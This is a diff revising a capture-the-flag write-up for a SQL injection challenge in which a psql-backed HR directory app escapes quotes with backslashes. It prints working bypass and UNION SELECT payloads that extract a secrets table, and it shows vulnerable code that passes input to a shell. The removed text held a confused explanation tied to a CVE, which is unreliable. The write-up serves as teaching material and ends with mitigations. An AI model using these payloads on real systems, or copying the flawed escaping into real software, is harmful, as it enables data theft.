@@ -8,7 +8,7 @@
 
 ## Overview
 
-This challenge exploits CVE-2025-1094, a vulnerability in PostgreSQL's `psql` command-line tool where escape sequence handling can bypass standard SQL injection protections. The application sanitizes single quotes by doubling them (`'` -> `''`), but the psql client mishandles escape sequences like `\'`, allowing attackers to break out of string literals.
+This challenge exploits a SQL injection vulnerability caused by improper quote escaping in a PostgreSQL application. The app uses backslash escaping (`'` -> `\'`) combined with `standard_conforming_strings=off`, which allows attackers to bypass the sanitization using the `\'` escape sequence.
 
 ## Vulnerability Analysis
 
@@ -16,155 +16,179 @@ This challenge exploits CVE-2025-1094, a vulnerability in PostgreSQL's `psql` co
 
 ```python
 def sanitize_input(user_input):
-    return user_input.replace("'", "''")
+    # Flawed: escapes quotes with backslash
+    return user_input.replace("'", "\\'")
 
 psql_cmd = (
     f'psql -h {host} -U {user} -d {db} '
-    f"-c \"SET standard_conforming_strings=off; SELECT * FROM employees WHERE name ILIKE E'%{sanitized}%'\""
+    f"-c \"SET standard_conforming_strings=off; SELECT * FROM employees WHERE department = '{sanitized}' ...\""
 )
 subprocess.run(psql_cmd, shell=True, ...)
 ```
-
-The application uses PostgreSQL escape strings (`E'...'`) with `standard_conforming_strings=off`, which means backslash sequences like `\'` are interpreted as escape sequences.
 
 ### Why Standard Injection Fails
 
 When a user inputs `' OR 1=1--`, the application transforms it to:
 ```
-'' OR 1=1--
+\' OR 1=1--
 ```
 
-This results in a valid SQL string that doesn't break out of the quotes.
+The quote is escaped, so the SQL string remains intact and no injection occurs.
 
-### The Bypass: Escape Sequence Injection
+### The Bypass: Backslash Escape Sequence
 
-The key insight is that `psql` interprets escape sequences differently than the application expects.
+The key insight is that with `standard_conforming_strings=off`, backslash sequences are interpreted:
+- `\\` = literal backslash character
+- `\'` = literal quote character (inside string)
 
-When a user inputs `\'`, the application sees:
-- A backslash followed by a single quote
-- Since there's no standalone `'`, no escaping is applied
-- The input passes through unchanged as `\'`
+**Attack Input:** `\' OR 1=1--`
 
-When `psql` processes this:
-- In certain contexts, `\'` is interpreted as an escaped literal quote
-- This causes the string delimiter to be consumed incorrectly
-- The subsequent characters break out of the string context
+**After Sanitization:** `\\' OR 1=1--`
+- The `\` in our input stays as `\`
+- The `'` becomes `\'`
+- Result: `\` + `\'` = `\\'`
 
-## Step-by-Step Exploitation
+**In SQL with standard_conforming_strings=off:**
+```sql
+WHERE department = '\\' OR 1=1--'
+```
+- `\\` = escaped backslash = literal `\`
+- `'` = **ends the string**
+- ` OR 1=1--` = SQL injection!
+
+---
+
+## Step-by-Step Solution
 
 ### Step 1: Reconnaissance
 
-Visit the application and observe:
-- Professional HR employee directory search
-- Footer reveals: "PostgreSQL 16.6 | psql CLI Backend"
-- Page description mentions "command-line database interface"
+1. Visit the application at `http://localhost:8888`
+2. Browse the Employee Directory - notice it's a search interface
+3. Check the **footer**: `PostgreSQL 16.6 | psql CLI Backend`
+4. Navigate to **Settings** page and find:
+   - Connection Method: `psql CLI`
+   - Query Mode: `Shell Subprocess`
+   - Restricted Tables: `hr_secrets` (highlighted in red)
+5. Navigate to **Reports** page and notice:
+   - "HR Confidential Records" report is locked/restricted
+   - Info message about "restricted data tables"
 
-### Step 2: Test Standard Injection
+### Step 2: Test Standard SQL Injection
 
-Input: `' OR 1=1--`
-
-Result: No injection - quotes are properly escaped
-
-### Step 3: Test Escape Sequence Bypass
-
-Input: `\' OR 1=1--`
-
-Result: Query behaves differently, indicating successful injection
-
-### Step 4: Enumerate Tables
-
-To discover the `hr_secrets` table, use UNION-based injection:
-
-**Payload to find tables:**
+In the search box, try:
 ```
-\' UNION SELECT 1,table_name,table_schema,table_type,table_catalog FROM information_schema.tables WHERE table_schema='public'--
+' OR 1=1--
 ```
 
-This reveals:
-- `employees` table
-- `hr_secrets` table
+**Result:** No results - the quote is being escaped. Standard SQLi doesn't work.
 
-### Step 5: Enumerate Columns
+### Step 3: Research the Vulnerability
 
-**Payload to find columns in hr_secrets:**
+Clues gathered:
+- PostgreSQL 16.6
+- psql CLI backend (shell subprocess)
+- Quote escaping is enabled
+- `standard_conforming_strings` might be off
+
+Research: PostgreSQL backslash escape + quote escaping bypass leads to the `\'` technique.
+
+### Step 4: Test Escape Sequence Bypass
+
+In the search box, enter:
 ```
-\' UNION SELECT 1,column_name,data_type,table_name,ordinal_position::text FROM information_schema.columns WHERE table_name='hr_secrets'--
-```
-
-This reveals columns:
-- `id`
-- `key`
-- `value`
-- `classification`
-- `created_at`
-
-### Step 6: Extract the Flag
-
-**Final payload:**
-```
-\' UNION SELECT id,key,value,classification,created_at::text FROM hr_secrets--
+\' OR 1=1--
 ```
 
-This returns all rows from `hr_secrets`, including:
-```
-1 | admin_flag | Exploit3rs{th3_gr34t_3sc4p3_cve2025} | TOP SECRET
-```
+**Result:** All 10 employees returned! The injection works.
 
-## Alternative Payloads
+### Step 5: Extract the Flag
 
-### Direct Flag Extraction
+Now that we know injection works and the table is `hr_secrets`, use UNION injection:
+
 ```
-\' UNION SELECT 1,value,'x','y','z' FROM hr_secrets WHERE key='admin_flag'--
+\' UNION SELECT 1,key,value,classification,key FROM hr_secrets--
 ```
 
-### Using CONCAT for cleaner output
+**Result:** The hr_secrets table contents are displayed, including:
+
+| Employee | Department | Position | Email |
+|----------|------------|----------|-------|
+| admin_flag | Exploit3rs{th3_gr34t_3sc4p3_cve2025} | TOP SECRET | admin_flag |
+
+---
+
+## Working Payloads
+
+### Confirm Injection
 ```
-\' UNION SELECT 1,CONCAT(key,':',value),'a','b','c' FROM hr_secrets--
+\' OR 1=1--
 ```
 
-### Boolean-based (if UNION is filtered)
+### Extract Flag
 ```
-\' AND (SELECT CASE WHEN (SELECT value FROM hr_secrets WHERE key='admin_flag') LIKE 'Exploit3rs%' THEN 1 ELSE 1/0 END)=1--
+\' UNION SELECT 1,key,value,classification,key FROM hr_secrets--
 ```
 
-## Technical Details
+### Alternative - Get All Secrets
+```
+\' UNION SELECT id,key,value,classification,key FROM hr_secrets--
+```
 
-### CVE-2025-1094 Specifics
-
-The vulnerability exists in PostgreSQL versions before:
-- 17.3
-- 16.7
-- 15.11
-- 14.16
-- 13.19
-
-The issue is in how `psql` handles escape sequences in certain string processing scenarios. When the application performs quote escaping but passes the result to psql via shell command, the escape sequence `\'` can cause unexpected parsing behavior.
-
-### Why This Works
-
-1. The application sanitizes `'` to `''` but doesn't consider `\'`
-2. The backslash-quote sequence `\'` is not modified
-3. When psql parses the command, it may interpret `\'` as an escape sequence
-4. This causes the string terminator to be misaligned
-5. Subsequent SQL after the `\'` is executed as code, not data
-
-### Affected Scenarios
-
-This vulnerability specifically affects applications that:
-1. Use the `psql` command-line tool via subprocess/shell execution
-2. Implement quote escaping but not backslash handling
-3. Construct SQL queries with user input embedded in strings
-
-## Mitigation
-
-1. **Update PostgreSQL** to version 16.7 or later
-2. **Use parameterized queries** with proper database drivers (psycopg2, etc.)
-3. **Avoid shelling out** to psql for database operations
-4. **Escape backslashes** in addition to quotes
-5. **Use allowlist validation** for user input when possible
+---
 
 ## Flag
 
 ```
 Exploit3rs{th3_gr34t_3sc4p3_cve2025}
 ```
+
+---
+
+## Technical Deep Dive
+
+### Why `\'` Becomes `\\'`
+
+1. User input: `\' OR 1=1--`
+2. Sanitization replaces `'` with `\'`:
+   - Input has: `\` then `'` then ` OR 1=1--`
+   - The `'` becomes `\'`
+   - Result: `\` + `\'` + ` OR 1=1--` = `\\' OR 1=1--`
+
+### Why `\\'` Breaks the String
+
+With `standard_conforming_strings=off`:
+- `\\` is an escape sequence for a literal backslash
+- The next `'` is NOT escaped, so it terminates the string
+- Everything after is executed as SQL
+
+### The Final Query
+
+```sql
+SELECT id, name, department, position, email
+FROM employees
+WHERE department = '\\' OR 1=1--'
+OR name = '\\' OR 1=1--'
+ORDER BY name
+```
+
+Parses as:
+```sql
+SELECT ... WHERE department = '\' OR 1=1
+```
+
+---
+
+## Mitigation
+
+1. **Use parameterized queries** - Never concatenate user input into SQL
+2. **Use proper database drivers** - psycopg2 with parameterized queries
+3. **Don't shell out to psql** - Use native database connections
+4. **Keep standard_conforming_strings=on** - Modern PostgreSQL default
+5. **Use quote doubling, not backslash escaping** - `''` instead of `\'`
+
+---
+
+## References
+
+- PostgreSQL String Constants: https://www.postgresql.org/docs/current/sql-syntax-lexical.html
+- standard_conforming_strings: https://www.postgresql.org/docs/current/runtime-config-compatible.html
